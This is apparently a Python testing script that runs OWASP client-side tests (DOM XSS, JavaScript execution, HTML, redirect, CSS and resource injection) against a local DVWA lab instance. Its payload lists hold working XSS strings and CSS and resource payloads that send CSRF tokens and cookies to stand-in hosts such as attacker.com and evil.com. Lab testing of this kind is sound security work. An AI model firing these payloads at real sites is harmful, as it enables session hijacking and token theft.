import requests
from bs4 import BeautifulSoup
from datetime import datetime
import urllib.parse
from urllib.parse import urlparse
import argparse

class DVWAClientTester:
    def __init__(self, base_url="http://localhost:8080", username="admin", password="password"):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.log_file = "dvwa_client_test_log.txt"
        self.security_level = "low"

    def write_log(self, entry: str):
        """Write log entries to the log file"""
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} | {entry}\n")

    def login(self):
        """Login to DVWA and set security level to low"""
        login_url = f"{self.base_url}/login.php"
        security_url = f"{self.base_url}/security.php"
        
        # Get login page and extract token
        resp = self.session.get(login_url)
        soup = BeautifulSoup(resp.text, 'html.parser')
        token_input = soup.find("input", {"name": "user_token"})
        token = token_input['value'] if token_input else ''
        
        # Perform login
        data = {
            "username": self.username,
            "password": self.password,
            "Login": "Login",
            "user_token": token
        }
        login_resp = self.session.post(login_url, data=data)
        
        if "logout.php" in login_resp.text:
            self.write_log(f"[+] Login successful (Status: {login_resp.status_code})")
            
            # Set security level to low
            sec_resp = self.session.get(security_url)
            sec_soup = BeautifulSoup(sec_resp.text, 'html.parser')
            sec_token = sec_soup.find("input", {"name": "user_token"})['value']
            
            sec_data = {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": sec_token
            }
            self.session.post(security_url, data=sec_data)
            self.write_log("[+] Security level set to low")
            return True
        else:
            self.write_log(f"[-] Login failed (Status: {login_resp.status_code})")
            return False

    def OTG_CLIENT_001(self):
        """
        Testing for DOM-based Cross-Site Scripting (OTG-CLIENT-001)
        Tests DVWA pages that are susceptible to DOM XSS vulnerabilities
        """
        self.write_log("----- Starting OTG-CLIENT-001 (DOM-based XSS) -----")
        
        # DVWA pages that might be vulnerable to DOM XSS
        test_pages = [
            f"{self.base_url}/vulnerabilities/xss_d/",  # DOM XSS page
            f"{self.base_url}/vulnerabilities/client/", # Client-side page
            f"{self.base_url}/vulnerabilities/xss_r/",  # Might have DOM elements
            f"{self.base_url}/vulnerabilities/xss_s/"   # Might have DOM elements
        ]
        
        # DOM XSS payloads targeting various sinks
        dom_payloads = [
            # Classic DOM XSS payloads
            "#<script>alert('DOM XSS')</script>",
            "#javascript:alert('XSS')",
            "#\" onmouseover=\"alert('XSS')\"",
            
            # Fragment identifier payloads
            "#<img src=x onerror=alert('XSS')>",
            "#<svg/onload=alert('XSS')>",
            
            # URL-based payloads
            "#{alert('XSS')}",
            "#javascript:alert(document.cookie)",
            
            # Modern evasion techniques
            "#<script>alert`1`</script>",
            "#<iframe srcdoc='<script>alert(1)</script>'>",
            
            # DOM sink specific payloads
            "#<img src='x' onerror='eval(location.hash.slice(1))'>",
            "#document.write('<script>alert(1)</script>')",
            
            # Browser-specific payloads
            "#<script defer>alert(1)</script>",
            "#<script async>alert(1)</script>"
        ]
        
        # DOM sinks to check for in JavaScript code
        dom_sinks = [
            "document.write",
            "document.writeln",
            "innerHTML",
            "outerHTML",
            "eval",
            "setTimeout",
            "setInterval",
            "Function",
            "location",
            "location.href",
            "location.hash",
            "location.search",
            "location.pathname",
            "window.name",
            "document.cookie",
            "document.domain",
            "postMessage"
        ]
        
        for page in test_pages:
            self.write_log(f"\n[i] Testing page: {page}")
            
            # First check if the page has obvious DOM sinks in its JavaScript
            resp = self.session.get(page)
            dom_sinks_found = []
            
            for sink in dom_sinks:
                if sink in resp.text:
                    dom_sinks_found.append(sink)
                    self.write_log(f"  - Found potential DOM sink: {sink}")
            
            if not dom_sinks_found:
                self.write_log("  - No obvious DOM sinks found in page source")
            
            # Test each payload
            for payload in dom_payloads:
                try:
                    test_url = f"{page}{payload}"
                    self.write_log(f"  - Testing payload: {payload}")
                    
                    # Send request and check response
                    resp = self.session.get(test_url)
                    
                    # Check if payload appears in response
                    if payload.strip("#") in resp.text:
                        self.write_log(f"    [!] Payload reflected in response: {payload}")
                    
                    # Check for script execution indicators
                    if "<script>alert" in resp.text or "javascript:alert" in resp.text:
                        self.write_log(f"    [✓] Possible DOM XSS vulnerability found with payload: {payload}")
                        print(f"[+] Possible DOM XSS vulnerability found at {test_url}")
                    
                    # Check for error messages that might indicate partial execution
                    if "SyntaxError" in resp.text or "ReferenceError" in resp.text:
                        self.write_log(f"    [!] JavaScript error detected with payload: {payload}")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                    continue
            
            # Special test for location.hash vulnerabilities
            if "xss_d" in page:  # DVWA's DOM XSS page
                hash_payloads = [
                    "default=<script>alert('XSS')</script>",
                    "default=javascript:alert('XSS')",
                    "default=1' onmouseover='alert(1)'",
                    "default=<img src=x onerror=alert(1)>"
                ]
                
                for payload in hash_payloads:
                    try:
                        test_url = f"{page}?{payload}"
                        self.write_log(f"  - Testing location.hash payload: {payload}")
                        
                        resp = self.session.get(test_url)
                        
                        if "alert(" in resp.text or "onerror=" in resp.text:
                            self.write_log(f"    [✓] Possible location.hash XSS with payload: {payload}")
                            print(f"[+] Possible location.hash XSS at {test_url}")
                            
                    except Exception as e:
                        self.write_log(f"    [x] Error testing hash payload '{payload}': {str(e)}")
        
        self.write_log("----- OTG-CLIENT-001 Test Completed -----\n")


    def OTG_CLIENT_002(self):
        """
        Testing for JavaScript Execution (OTG-CLIENT-002)
        Tests DVWA pages for JavaScript injection vulnerabilities
        """
        self.write_log("----- Starting OTG-CLIENT-002 (JavaScript Execution) -----")
        
        # DVWA pages that might be vulnerable to JavaScript injection
        test_pages = [
            f"{self.base_url}/vulnerabilities/xss_d/",  # DOM XSS page
            f"{self.base_url}/vulnerabilities/xss_r/",  # Reflected XSS page
            f"{self.base_url}/vulnerabilities/client/", # Client-side page
            f"{self.base_url}/vulnerabilities/sqli/",   # Might have JS execution
            f"{self.base_url}/vulnerabilities/exec/"    # Command exec might have JS
        ]
        
        # JavaScript injection payloads
        js_payloads = [
            # Basic JS execution
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            "javascript:prompt(1)",
            "javascript:confirm(1)",
            
            # Without javascript: prefix
            "alert(1)",
            "confirm(1)",
            "prompt(1)",
            
            # Encoded versions
            "jav&#x61;script:alert(1)",
            "jav%0ascript:alert(1)",
            "javascript&#58;alert(1)",
            
            # Using eval
            "eval('alert(1)')",
            "setTimeout('alert(1)',0)",
            "setInterval('alert(1)',1000)",
            
            # Using Function constructor
            "Function('alert(1)')()",
            "new Function('alert(1)')()",
            
            # Using event handlers
            "onerror=alert;throw 1",
            "onload=alert(1)",
            "onmouseover=alert(1)",
            
            # Using data URIs
            "data:text/javascript,alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            
            # Using JS pseudo-protocols
            "vbscript:msgbox(1)",
            "livescript:alert(1)"
        ]
        
        # JavaScript sinks to check for
        js_sinks = [
            "eval(",
            "setTimeout(",
            "setInterval(",
            "Function(",
            "new Function(",
            "script.src",
            "script.text",
            "script.innerHTML",
            "location=",
            "location.href=",
            "location.assign(",
            "location.replace(",
            "document.write(",
            "document.writeln(",
            "innerHTML=",
            "outerHTML=",
            "window.open(",
            "window.name="
        ]
        
        for page in test_pages:
            self.write_log(f"\n[i] Testing page: {page}")
            
            # First check if the page has obvious JS sinks in its code
            resp = self.session.get(page)
            js_sinks_found = []
            
            for sink in js_sinks:
                if sink in resp.text:
                    js_sinks_found.append(sink)
                    self.write_log(f"  - Found potential JS sink: {sink}")
            
            if not js_sinks_found:
                self.write_log("  - No obvious JS sinks found in page source")
            
            # Test each payload in URL parameters
            for payload in js_payloads:
                try:
                    # Test in URL fragment
                    test_url_fragment = f"{page}#{payload}"
                    self.write_log(f"  - Testing fragment payload: {payload}")
                    
                    resp = self.session.get(test_url_fragment)
                    
                    # Check for execution indicators
                    self._check_js_response(resp, payload, "URL fragment")
                    
                    # Test in query parameters
                    test_url_param = f"{page}?test={urllib.parse.quote(payload)}"
                    self.write_log(f"  - Testing parameter payload: {payload}")
                    
                    resp = self.session.get(test_url_param)
                    self._check_js_response(resp, payload, "URL parameter")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                    continue
            
            # Special test for form inputs that might execute JS
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = page
                else:
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{page}{form_action}"
                
                form_method = form.get('method', 'GET').upper()
                inputs = form.find_all('input')
                
                # Find all input parameters
                param_names = []
                for input_tag in inputs:
                    if input_tag.get('name') and input_tag.get('type') != 'hidden':
                        param_names.append(input_tag.get('name'))
                
                if not param_names:
                    continue
                
                # Test each parameter with JS payloads
                for param in param_names:
                    for payload in js_payloads[:5]:  # Test subset to avoid too many requests
                        try:
                            data = {param: payload}
                            
                            if form_method == 'POST':
                                resp = self.session.post(form_action, data=data)
                            else:
                                resp = self.session.get(form_action, params=data)
                            
                            self._check_js_response(resp, payload, f"form parameter {param}")
                        
                        except Exception as e:
                            self.write_log(f"    [x] Error testing form payload '{payload}': {str(e)}")
                            continue
        
        self.write_log("----- OTG-CLIENT-002 Test Completed -----\n")

    def _check_js_response(self, resp, payload, context=""):
        """Helper method to check responses for signs of JS execution"""
        context = f" ({context})" if context else ""
        
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'{context}")
            return
        
        # Check for signs of successful JS injection
        success_patterns = [
            ("alert(", "Possible JS execution"),
            ("javascript:", "JS protocol found"),
            ("eval(", "eval function found"),
            ("Function(", "Function constructor found"),
            ("<script>", "Script tag found"),
            ("onerror=", "Event handler found"),
            ("onload=", "Event handler found"),
            ("document.cookie", "Cookie access attempt"),
            ("window.location", "Redirection attempt")
        ]
        
        for pattern, message in success_patterns:
            if pattern in resp.text:
                self.write_log(f"    [✓] {message} with payload '{payload}'{context}")
                return
        
        # Check for error messages
        error_patterns = [
            "SyntaxError", "ReferenceError", "TypeError", 
            "EvalError", "URIError", "SecurityError",
            "script", "javascript", "execution"
        ]
        
        for error in error_patterns:
            if error.lower() in resp.text.lower():
                self.write_log(f"    [!] Possible JS injection - {error} error with payload '{payload}'{context}")
                return
        
        # Check if payload is reflected
        if payload in resp.text or urllib.parse.unquote(payload) in resp.text:
            self.write_log(f"    [!] JS payload reflected with '{payload}'{context}")
        else:
            self.write_log(f"    [-] No obvious JS injection with payload '{payload}'{context}")


    def OTG_CLIENT_003(self):
        """
        Testing for HTML Injection (OTG-CLIENT-003)
        Tests DVWA pages for HTML injection vulnerabilities
        """
        self.write_log("----- Starting OTG-CLIENT-003 (HTML Injection) -----")
        
        # DVWA pages that might be vulnerable to HTML injection
        test_pages = [
            f"{self.base_url}/vulnerabilities/xss_r/",  # Reflected XSS page
            f"{self.base_url}/vulnerabilities/xss_s/",  # Stored XSS page
            f"{self.base_url}/vulnerabilities/xss_d/",  # DOM XSS page
            f"{self.base_url}/vulnerabilities/client/", # Client-side page
            f"{self.base_url}/vulnerabilities/sqli/"    # Might reflect HTML
        ]
        
        # HTML injection payloads
        html_payloads = [
            # Basic HTML tags
            "<h1>HTML Injection Test</h1>",
            "<b>Bold Text</b>",
            "<i>Italic Text</i>",
            
            # Image tags with event handlers
            "<img src='x' onerror='alert(1)'>",
            "<img src=x onerror=alert(1)>",
            "<img src=x oneonerror=alert(1)>",
            
            # Iframe tags
            "<iframe src='javascript:alert(1)'>",
            "<iframe src='data:text/html,<script>alert(1)</script>'>",
            
            # SVG tags
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            
            # Anchor tags
            "<a href='javascript:alert(1)'>Click</a>",
            "<a href='data:text/html,<script>alert(1)</script>'>Click</a>",
            
            # Form tags
            "<form action='http://evil.com'><input type='submit'></form>",
            "<form><input name='user'><input type='submit'></form>",
            
            # Input tags
            "<input type='text' onfocus=alert(1) autofocus>",
            "<input type='text' onmouseover=alert(1)>",
            
            # Div tags with styles
            "<div style='color:red'>Red Text</div>",
            "<div style='position:absolute;top:0;left:0;width:100%;height:100%;background:red;z-index:9999'></div>",
            
            # Meta tags
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
            
            # Mixed case and obfuscated
            "<ImG sRc=x oNeRrOr=alert(1)>",
            "<\x00img src=x onerror=alert(1)>",
            "<img/src='x'/onerror=alert(1)>"
        ]
        
        # HTML sinks to check for
        html_sinks = [
            "innerHTML=",
            "outerHTML=",
            "document.write(",
            "document.writeln(",
            "insertAdjacentHTML(",
            ".html(",
            ".append(",
            ".prepend(",
            ".before(",
            ".after(",
            ".replaceWith(",
            "jQuery.html(",
            "jQuery.append(",
            "DOMParser.parseFromString(",
            "Range.createContextualFragment("
        ]
        
        for page in test_pages:
            self.write_log(f"\n[i] Testing page: {page}")
            
            # First check if the page has obvious HTML sinks in its code
            resp = self.session.get(page)
            html_sinks_found = []
            
            for sink in html_sinks:
                if sink.lower() in resp.text.lower():
                    html_sinks_found.append(sink)
                    self.write_log(f"  - Found potential HTML sink: {sink}")
            
            if not html_sinks_found:
                self.write_log("  - No obvious HTML sinks found in page source")
            
            # Test each payload in URL parameters
            for payload in html_payloads:
                try:
                    # Test in URL parameters
                    test_url = f"{page}?test={urllib.parse.quote(payload)}"
                    self.write_log(f"  - Testing payload: {payload}")
                    
                    resp = self.session.get(test_url)
                    
                    # Check for HTML injection
                    self._check_html_response(resp, payload, "URL parameter")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                    continue
            
            # Special test for form inputs that might reflect HTML
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                form_action = form.get('action')
                if not form_action or form_action == '#':
                    form_action = page
                else:
                    if not form_action.startswith(('http://', 'https://')):
                        form_action = f"{self.base_url}{form_action}" if form_action.startswith('/') else f"{page}{form_action}"
                
                form_method = form.get('method', 'GET').upper()
                inputs = form.find_all('input')
                
                # Find all input parameters
                param_names = []
                for input_tag in inputs:
                    if input_tag.get('name') and input_tag.get('type') != 'hidden':
                        param_names.append(input_tag.get('name'))
                
                if not param_names:
                    continue
                
                # Test each parameter with HTML payloads
                for param in param_names:
                    for payload in html_payloads[:5]:  # Test subset to avoid too many requests
                        try:
                            data = {param: payload}
                            
                            if form_method == 'POST':
                                resp = self.session.post(form_action, data=data)
                            else:
                                resp = self.session.get(form_action, params=data)
                            
                            self._check_html_response(resp, payload, f"form parameter {param}")
                        
                        except Exception as e:
                            self.write_log(f"    [x] Error testing form payload '{payload}': {str(e)}")
                            continue
        
        self.write_log("----- OTG-CLIENT-003 Test Completed -----\n")

    def _check_html_response(self, resp, payload, context=""):
        """Helper method to check responses for signs of HTML injection"""
        import re
        context = f" ({context})" if context else ""
        
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'{context}")
            return
        
        # Check for signs of successful HTML injection
        success_patterns = [
            ("<img", "Image tag found"),
            ("<script", "Script tag found"),
            ("<iframe", "Iframe tag found"),
            ("<svg", "SVG tag found"),
            ("onerror=", "Event handler found"),
            ("onload=", "Event handler found"),
            ("javascript:", "JavaScript protocol found"),
            ("<h1>HTML Injection Test</h1>", "Plain HTML injection successful")
        ]
        
        for pattern, message in success_patterns:
            if pattern.lower() in resp.text.lower():
                self.write_log(f"    [✓] {message} with payload '{payload}'{context}")
                return
        
        # Check if payload is reflected intact
        if payload in resp.text or urllib.parse.unquote(payload) in resp.text:
            self.write_log(f"    [!] HTML payload reflected without encoding with '{payload}'{context}")
        else:
            # Check if parts of payload are reflected
            clean_payload = re.sub(r'[<>"\']', '', payload)
            if clean_payload and clean_payload in resp.text:
                self.write_log(f"    [!] HTML payload partially reflected (tags stripped) with '{payload}'{context}")
            else:
                self.write_log(f"    [-] No obvious HTML injection with payload '{payload}'{context}")


    def OTG_CLIENT_004(self):
        """
        Testing for Client Side URL Redirect (OTG-CLIENT-004)
        Tests DVWA pages for unsafe client-side redirection vulnerabilities
        """
        self.write_log("----- Starting OTG-CLIENT-004 (Client Side URL Redirect) -----")
        
        # DVWA pages that might be vulnerable to open redirects
        test_pages = [
            f"{self.base_url}/vulnerabilities/redirect/",  # DVWA's redirect page
            f"{self.base_url}/vulnerabilities/client/",    # Client-side page
            f"{self.base_url}/vulnerabilities/xss_d/",    # Might have redirects
            f"{self.base_url}/login.php",                 # Login page might redirect
            f"{self.base_url}/logout.php"                 # Logout might redirect
        ]
        
        # URL redirect payloads
        redirect_payloads = [
            # External domains
            "http://evil.com",
            "https://attacker.site",
            "//evil.com",
            
            # JavaScript pseudo-protocols
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            "javascript:eval('alert(1)')",
            
            # Data URIs
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            
            # Meta redirects
            "http://example.com%0d%0aLocation:%20http://evil.com",
            
            # Obfuscated URLs
            "hTtP://evil.com",
            "http://evil.com@attacker.site",
            "http://127.0.0.1:8080.attacker.site",
            
            # Relative paths
            "/../../../../etc/passwd",
            "\\\\evil.com\\share",
            
            # Browser-specific schemes
            "chrome://settings",
            "about:blank",
            "view-source:http://evil.com",
            
            # Double encoded
            "http%3A%2F%2Fevil.com",
            "j%61v%61script%3Aalert%281%29"
        ]
        
        # Redirection sinks to check for
        redirect_sinks = [
            "window.location=",
            "window.location.href=",
            "window.location.replace(",
            "window.location.assign(",
            "document.location=",
            "document.location.href=",
            "location.href=",
            "location.replace(",
            "location.assign(",
            "window.open(",
            "window.navigate(",
            "url=",
            "redirect=",
            "next=",
            "forward=",
            "dest=",
            "target=",
            "rurl=",
            "return=",
            "returnUrl=",
            "redirect_uri=",
            "redirect_url="
        ]
        
        for page in test_pages:
            self.write_log(f"\n[i] Testing page: {page}")
            
            # First check if the page has obvious redirect sinks in its code
            resp = self.session.get(page)
            redirect_sinks_found = []
            
            for sink in redirect_sinks:
                if sink.lower() in resp.text.lower():
                    redirect_sinks_found.append(sink)
                    self.write_log(f"  - Found potential redirect sink: {sink}")
            
            if not redirect_sinks_found:
                self.write_log("  - No obvious redirect sinks found in page source")
            
            # Test each payload in URL parameters
            for payload in redirect_payloads:
                try:
                    # Test in URL parameters
                    test_url = f"{page}?redirect={urllib.parse.quote(payload)}"
                    self.write_log(f"  - Testing redirect payload: {payload}")
                    
                    resp = self.session.get(test_url, allow_redirects=False)
                    
                    # Check for redirect headers
                    if 300 <= resp.status_code < 400:
                        location = resp.headers.get('Location', '')
                        if payload in location or urllib.parse.unquote(payload) in location:
                            self.write_log(f"    [✓] Open redirect found! Location: {location}")
                            print(f"[+] Open redirect vulnerability found at {test_url}")
                        else:
                            self.write_log(f"    [!] Redirect detected but payload not in Location header (Status: {resp.status_code})")
                    else:
                        # Check for client-side redirection
                        self._check_client_redirect(resp, payload, "URL parameter")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                    continue
            
            # Special test for hash-based redirects (common in client-side)
            for payload in redirect_payloads[:5]:  # Test subset
                try:
                    test_url = f"{page}#{payload}"
                    self.write_log(f"  - Testing hash redirect payload: {payload}")
                    
                    resp = self.session.get(test_url)
                    self._check_client_redirect(resp, payload, "URL hash")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing hash payload '{payload}': {str(e)}")
                    continue
        
        self.write_log("----- OTG-CLIENT-004 Test Completed -----\n")

    def _check_client_redirect(self, resp, payload, context=""):
        """Helper method to check for client-side redirection"""
        context = f" ({context})" if context else ""
        
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'{context}")
            return
        
        # Check for signs of client-side redirection
        redirect_patterns = [
            ("window.location", "window.location assignment found"),
            ("location.href", "location.href assignment found"),
            ("window.open(", "window.open call found"),
            ("window.navigate(", "window.navigate call found"),
            (payload, "Payload found in script"),
            (urllib.parse.unquote(payload), "Decoded payload found in script")
        ]
        
        for pattern, message in redirect_patterns:
            if pattern.lower() in resp.text.lower():
                self.write_log(f"    [✓] {message} with payload '{payload}'{context}")
                return
        
        # Check if payload is reflected in JavaScript context
        if f"'{payload}'" in resp.text or f'"{payload}"' in resp.text:
            self.write_log(f"    [!] Redirect payload reflected in script with '{payload}'{context}")
        else:
            self.write_log(f"    [-] No obvious redirect vulnerability with payload '{payload}'{context}")


    def OTG_CLIENT_005(self):
        """
        Testing for CSS Injection (OTG-CLIENT-005)
        Tests DVWA pages for CSS injection vulnerabilities
        """
        self.write_log("----- Starting OTG-CLIENT-005 (CSS Injection) -----")
        
        # DVWA pages that might be vulnerable to CSS injection
        test_pages = [
            f"{self.base_url}/vulnerabilities/xss_r/",  # Reflected XSS page
            f"{self.base_url}/vulnerabilities/xss_d/",  # DOM XSS page
            f"{self.base_url}/vulnerabilities/client/", # Client-side page
            f"{self.base_url}/vulnerabilities/csrf/",  # Might have token leakage
            f"{self.base_url}/vulnerabilities/upload/" # Might allow CSS uploads
        ]
        
        # CSS injection payloads
        css_payloads = [
            # Basic CSS injection
            "red; background-color: blue",
            "red; font-size: 100px",
            
            # JavaScript execution (older browsers)
            "red; -o-link:'javascript:alert(1)'",
            "red; -o-link-source: current",
            "expression(alert(1))",
            "red; -moz-binding: url('http://attacker.com/xss.xml')",
            
            # Attribute selectors for data exfiltration
            "red; } input[name=csrf_token][value^=a] { background-image: url(http://attacker.com/?a); }",
            "red; } input[name=user][value^=a] { background-image: url(http://attacker.com/?a); }",
            
            # @import rule for external CSS
            "red; @import url('http://attacker.com/malicious.css')",
            
            # @font-face with external URI
            "red; @font-face { font-family: x; src: url('http://attacker.com/steal') }",
            
            # Behavior property (IE)
            "red; behavior: url(xss.htc)",
            
            # Animation properties
            "red; animation-name: x; @keyframes x { from { background: url('http://attacker.com/?x') } }",
            
            # Media queries
            "red; @media screen { div { background-image: url('http://attacker.com/?screen') } }",
            
            # Namespace injection
            "red; @namespace x 'http://attacker.com/malicious'",
            
            # Obfuscated payloads
            "r\\65 d; background-color: blue",
            "red\\3b \\62 ackground-color\\3a blue",
            "\\72\\65\\64\\3b\\62\\61\\63\\6b\\67\\72\\6f\\75\\6e\\64\\2d\\63\\6f\\6c\\6f\\72\\3a\\62\\6c\\75\\65"
        ]
        
        # CSS sinks to check for
        css_sinks = [
            ".style=",
            ".cssText=",
            "style.cssText=",
            ".setAttribute('style'",
            ".setAttribute(\"style\"",
            "css(",
            "addRule(",
            "insertRule(",
            "createStyleSheet(",
            "stylesheet.cssText=",
            "document.write('<style>",
            "innerHTML+='<style>"
        ]
        
        for page in test_pages:
            self.write_log(f"\n[i] Testing page: {page}")
            
            # First check if the page has obvious CSS sinks in its code
            resp = self.session.get(page)
            css_sinks_found = []
            
            for sink in css_sinks:
                if sink.lower() in resp.text.lower():
                    css_sinks_found.append(sink)
                    self.write_log(f"  - Found potential CSS sink: {sink}")
            
            if not css_sinks_found:
                self.write_log("  - No obvious CSS sinks found in page source")
            
            # Test each payload in URL parameters
            for payload in css_payloads:
                try:
                    # Test in URL parameters
                    test_url = f"{page}?color={urllib.parse.quote(payload)}"
                    self.write_log(f"  - Testing payload: {payload}")
                    
                    resp = self.session.get(test_url)
                    
                    # Check for CSS injection
                    self._check_css_response(resp, payload, "URL parameter")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                    continue
            
            # Special test for hash-based CSS injection (common in client-side)
            for payload in css_payloads[:5]:  # Test subset
                try:
                    test_url = f"{page}#{payload}"
                    self.write_log(f"  - Testing hash CSS payload: {payload}")
                    
                    resp = self.session.get(test_url)
                    self._check_css_response(resp, payload, "URL hash")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing hash payload '{payload}': {str(e)}")
                    continue
        
        self.write_log("----- OTG-CLIENT-005 Test Completed -----\n")

    def _check_css_response(self, resp, payload, context=""):
        """Helper method to check responses for signs of CSS injection"""
        context = f" ({context})" if context else ""
        
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'{context}")
            return
        
        # Check for signs of successful CSS injection
        success_patterns = [
            ("expression(", "CSS expression found"),
            ("-o-link:", "Opera -o-link property found"),
            ("-moz-binding:", "Firefox binding found"),
            ("behavior:", "IE behavior property found"),
            ("@import", "CSS @import rule found"),
            ("@font-face", "CSS @font-face rule found"),
            ("@keyframes", "CSS animation found"),
            ("@namespace", "CSS namespace found"),
            ("background-image: url(", "External background image found"),
            ("javascript:", "JavaScript URI found"),
            (payload, "Raw payload reflected"),
            (urllib.parse.unquote(payload), "Decoded payload reflected")
        ]
        
        for pattern, message in success_patterns:
            if pattern.lower() in resp.text.lower():
                self.write_log(f"    [✓] {message} with payload '{payload}'{context}")
                return
        
        # Check if payload is reflected in style attribute or <style> tag
        if f"style=\"" in resp.text and payload.split(';')[0] in resp.text:
            self.write_log(f"    [!] CSS payload partially reflected in style attribute with '{payload}'{context}")
        elif "<style>" in resp.text and payload.split(';')[0] in resp.text:
            self.write_log(f"    [!] CSS payload partially reflected in <style> tag with '{payload}'{context}")
        else:
            self.write_log(f"    [-] No obvious CSS injection with payload '{payload}'{context}")


    def OTG_CLIENT_006(self):
        """
        Testing for Client Side Resource Manipulation (OTG-CLIENT-006)
        Tests DVWA pages for unsafe client-side resource loading vulnerabilities
        """
        self.write_log("----- Starting OTG-CLIENT-006 (Client Side Resource Manipulation) -----")
        
        # DVWA pages that might be vulnerable to resource manipulation
        test_pages = [
            f"{self.base_url}/vulnerabilities/xss_d/",  # DOM XSS page
            f"{self.base_url}/vulnerabilities/client/", # Client-side page
            f"{self.base_url}/vulnerabilities/upload/", # Might load resources
            f"{self.base_url}/vulnerabilities/fi/",    # File inclusion
            f"{self.base_url}/vulnerabilities/cors/"   # CORS testing
        ]
        
        # Resource manipulation payloads
        resource_payloads = [
            # External script sources
            "http://evil.com/malicious.js",
            "//evil.com/malicious.js",
            "data:text/javascript,alert(1)",
            
            # Iframe sources
            "http://evil.com/phishing.html",
            "javascript:alert(document.cookie)",
            
            # Image sources
            "http://evil.com/log.php?cookie=" + "${document.cookie}",
            "x\" onerror=\"alert(1)",
            
            # Object/embed data
            "http://evil.com/malicious.swf",
            "data:application/x-shockwave-flash,alert(1)",
            
            # CSS resources
            "http://evil.com/malicious.css",
            "javascript:alert(1);",
            
            # AJAX endpoints
            "http://evil.com/steal.php?data=",
            "/api/userdata?callback=evilFunction",
            
            # Obfuscated URLs
            "hTtP://evil.com",
            "http://127.0.0.1@evil.com",
            "http://evil.com\\@attacker.com",
            "http://evil.com?.victim.com",
            
            # Browser-specific schemes
            "chrome-extension://malicious",
            "ms-browser-extension://malicious"
        ]
        
        # Resource loading sinks to check for
        resource_sinks = [
            "src=",
            "href=",
            "data=",
            "xhr.open(",
            "fetch(",
            "import(",
            "require(",
            "load(",
            "appendChild(",
            "insertBefore(",
            "createElement(",
            "setAttribute('src'",
            "setAttribute(\"src\"",
            "background: url(",
            "background-image: url(",
            "url("
        ]
        
        for page in test_pages:
            self.write_log(f"\n[i] Testing page: {page}")
            
            # First check if the page has obvious resource sinks in its code
            resp = self.session.get(page)
            resource_sinks_found = []
            
            for sink in resource_sinks:
                if sink.lower() in resp.text.lower():
                    resource_sinks_found.append(sink)
                    self.write_log(f"  - Found potential resource sink: {sink}")
            
            if not resource_sinks_found:
                self.write_log("  - No obvious resource sinks found in page source")
            
            # Test each payload in URL parameters
            for payload in resource_payloads:
                try:
                    # Test in URL parameters
                    test_url = f"{page}?resource={urllib.parse.quote(payload)}"
                    self.write_log(f"  - Testing payload: {payload}")
                    
                    resp = self.session.get(test_url)
                    
                    # Check for resource injection
                    self._check_resource_response(resp, payload, "URL parameter")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing payload '{payload}': {str(e)}")
                    continue
            
            # Special test for hash-based resource manipulation (common in client-side)
            for payload in resource_payloads[:5]:  # Test subset
                try:
                    test_url = f"{page}#{payload}"
                    self.write_log(f"  - Testing hash resource payload: {payload}")
                    
                    resp = self.session.get(test_url)
                    self._check_resource_response(resp, payload, "URL hash")
                    
                except Exception as e:
                    self.write_log(f"    [x] Error testing hash payload '{payload}': {str(e)}")
                    continue
        
        self.write_log("----- OTG-CLIENT-006 Test Completed -----\n")

    def _check_resource_response(self, resp, payload, context=""):
        """Helper method to check responses for signs of resource manipulation"""
        import re
        context = f" ({context})" if context else ""
        
        if resp.status_code != 200:
            self.write_log(f"    [!] HTTP {resp.status_code} with payload '{payload}'{context}")
            return
        
        # Check for signs of successful resource injection
        success_patterns = [
            ("src=\"" + payload, "src attribute injection"),
            ("src='" + payload, "src attribute injection"),
            ("href=\"" + payload, "href attribute injection"),
            ("href='" + payload, "href attribute injection"),
            ("data=\"" + payload, "data attribute injection"),
            ("data='" + payload, "data attribute injection"),
            ("xhr.open(", "XMLHttpRequest with external URL"),
            ("fetch(", "Fetch API with external URL"),
            ("url(" + payload, "CSS URL with external resource"),
            ("background: url(" + payload, "CSS background with external resource"),
            (".load(" + payload, "jQuery load() with external resource"),
            ("import(" + payload, "JavaScript import with external resource"),
            ("require(" + payload, "Node.js require with external resource")
        ]
        
        for pattern, message in success_patterns:
            if pattern.lower() in resp.text.lower():
                self.write_log(f"    [✓] {message} with payload '{payload}'{context}")
                return
        
        # Check if payload is reflected in JavaScript context
        if f"'{payload}'" in resp.text or f'"{payload}"' in resp.text:
            self.write_log(f"    [!] Resource payload reflected in script with '{payload}'{context}")
        else:
            # Check if payload is partially reflected
            clean_payload = re.sub(r'[^\w\-\.:\/]', '', payload)
            if clean_payload and clean_payload in resp.text:
                self.write_log(f"    [!] Resource payload partially reflected (sanitized) with '{payload}'{context}")
